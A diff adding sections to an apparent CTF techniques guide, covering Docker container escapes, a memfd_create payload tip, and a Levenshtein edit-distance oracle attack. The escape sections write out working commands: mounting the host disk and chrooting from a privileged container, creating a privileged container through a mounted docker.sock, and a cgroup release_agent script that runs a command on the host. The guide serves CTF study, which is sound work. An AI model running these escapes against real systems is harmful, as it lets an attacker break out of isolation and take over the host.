@@ -11,6 +11,12 @@
 - [100 Prisoners Problem / Cycle-Following Strategy (Sharif CTF 2016)](#100-prisoners-problem--cycle-following-strategy-sharif-ctf-2016)
 - [C Code Jail Escape via Emoji Identifiers and Gadget Embedding (Midnight Flag 2026)](#c-code-jail-escape-via-emoji-identifiers-and-gadget-embedding-midnight-flag-2026)
 - [BuildKit Daemon Exploitation for Build Secrets (BSidesSF 2026)](#buildkit-daemon-exploitation-for-build-secrets-bsidessf-2026)
+- [Docker Container Escape Techniques](#docker-container-escape-techniques)
+  - [Privileged Container Breakout](#privileged-container-breakout)
+  - [Docker Socket Escape](#docker-socket-escape)
+  - [Capability-Based Escape (CAP_SYS_ADMIN)](#capability-based-escape-cap_sys_admin)
+  - [Container Information Leakage](#container-information-leakage)
+- [Levenshtein Distance Oracle Attack (SunshineCTF 2016)](#levenshtein-distance-oracle-attack-sunshinectf-2016)
 - [References](#references)
 
 ---
@@ -23,6 +29,8 @@ cipher = ARC4.new(b"key")
 decrypted = cipher.decrypt(encrypted_data)
 open("dumped", "wb").write(decrypted)
 ```
+
+**Key insight:** Binaries using `memfd_create` execute payloads entirely in memory, leaving no file on disk. Intercept the decrypted payload before `fexecve` by hooking `memfd_create` or dumping `/proc/pid/fd/` entries, then analyze the dumped binary normally.
 
 ---
 
@@ -425,6 +433,66 @@ RUN --mount=type=secret,id=flag cat /run/secrets/flag; false
 
 ---
 
+## Docker Container Escape Techniques
+
+### Privileged Container Breakout
+
+Containers started with `--privileged` have all Linux capabilities and access to host devices. Mount the host filesystem and chroot:
+
+```bash
+# List host disks
+fdisk -l
+# Mount host root filesystem
+mkdir /mnt/host && mount /dev/sda1 /mnt/host
+# Chroot to host
+chroot /mnt/host /bin/bash
+# Or via nsenter (requires PID 1 on host)
+nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
+```
+
+### Docker Socket Escape
+
+If `/var/run/docker.sock` is mounted inside the container, create a new privileged container that mounts the host root:
+
+```bash
+# Check for socket
+ls -la /var/run/docker.sock
+# Escape: create privileged container with host root mounted
+docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host /bin/bash
+# Or via API if docker CLI unavailable:
+curl -s --unix-socket /var/run/docker.sock \
+  -X POST "http://localhost/containers/create" \
+  -H "Content-Type: application/json" \
+  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'
+```
+
+### Capability-Based Escape (CAP_SYS_ADMIN)
+
+With `CAP_SYS_ADMIN`, exploit cgroup release_agent for host command execution:
+
+```bash
+# Create cgroup, set release_agent to host command
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
+mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd && echo 'cat /flag > /tmp/cgrp/x/flag' >> /cmd && chmod +x /cmd
+echo $$ > /tmp/cgrp/x/cgroup.procs  # Trigger release_agent
+```
+
+### Container Information Leakage
+
+Even without escape, containers leak host info:
+- `/proc/self/cgroup` -- container ID
+- `/proc/mounts` -- overlayfs `upperdir` reveals host path
+- `/sys/kernel/slab/*/cgroup/` -- other container IDs (cgroup debug info)
+- `/proc/1/environ` -- environment variables from container start
+
+**Key insight:** Check `--privileged` flag, mounted sockets (`docker.sock`), and capabilities (`capsh --print`) first. Privileged = instant escape. Socket = create new privileged container. CAP_SYS_ADMIN = cgroup release_agent. Without any of these, focus on information leakage and application-level escapes.
+
+---
+
 ## References
 - EHAX 2026 "The Architect's Gambit": Multi-phase AES + HMAC + GF(256) Nim
 - BSidesSF 2026 "wromwarp": Emulator ROM-switching state preservation
@@ -434,6 +502,28 @@ RUN --mount=type=secret,id=flag cat /run/secrets/flag; false
 - Sharif CTF 2016: 100 prisoners problem / cycle-following strategy
 - Midnight Flag 2026: C code jail escape via emoji identifiers
 - BSidesSF 2026 "builds-as-a-service": BuildKit daemon build secret exploitation
+- SunshineCTF 2016: Levenshtein distance oracle attack
+
+---
+
+## Levenshtein Distance Oracle Attack (SunshineCTF 2016)
+
+Oracle responds with edit distance between guess and secret. Attack strategy:
+
+1. **Determine length:** Submit empty string, distance = secret length
+2. **Identify present characters:** Submit single repeated character (e.g., "aaaa..."), distance = len - count_of_that_char
+3. **Locate positions:** Binary search -- fill half positions with known-present char, half with known-absent, narrow by distance change
+
+```python
+# Determine which chars are present
+for c in string.printable:
+    d = oracle(c * length)
+    count = length - d  # Number of times c appears
+    if count > 0:
+        chars[c] = count
+```
+
+**Key insight:** Edit distance as a side channel. Binary search locates character positions from Levenshtein feedback in O(n log n) queries.
 
 ---
 
